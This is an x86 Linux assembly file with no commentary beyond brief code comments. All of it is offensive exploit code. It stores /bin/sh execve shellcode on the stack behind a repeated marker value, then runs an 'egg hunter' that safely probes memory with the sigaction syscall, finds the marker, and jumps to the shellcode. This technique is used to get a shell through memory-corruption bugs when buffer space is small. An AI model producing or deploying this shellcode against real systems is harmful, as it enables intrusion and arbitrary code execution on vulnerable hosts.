global _start

section .text
_start:
; push our /bin/sh shellcode onto the stack
        push 0x80cd0bb0
        push 0x04244c8d
        push 0x5424148b
        push 0x50e3896e
        push 0x69622f68
        push 0x68732f2f
        push 0x6850c031
; push our identifier
        push 0xaabbaabb
        push 0xaabbaabb

next_page:
        or cx, 0xffff
next_loc:
        inc ecx
        push byte +0x43
        pop eax
        int 0x80
        cmp al, 0xf2
        jz next_page
        mov eax, 0xaabbaabb
        mov edi, ecx
        scasd
        jnz next_loc
        scasd
        jnz next_loc
        jmp edi
